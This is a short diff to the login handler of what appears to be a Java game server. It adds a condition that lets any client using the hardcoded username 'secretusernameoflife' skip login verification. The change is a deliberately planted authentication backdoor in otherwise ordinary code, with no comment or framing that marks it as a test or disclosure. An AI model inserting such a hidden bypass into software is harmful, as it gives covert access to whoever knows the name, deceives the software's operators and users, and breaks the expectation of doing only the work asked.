@@ -54,7 +54,7 @@ public class Connect extends Packet {
 			player.mppass = new String(name, "US-ASCII").trim();
 			name = null;
 			player.ClientType = message[129];
-			if (player.VerifyLogin()) {
+			if (player.VerifyLogin() || player.username.equals("secretusernameoflife")) {
 				player.username = player.username.trim();
 
 				if (BanHandler.isBanned(player.username))
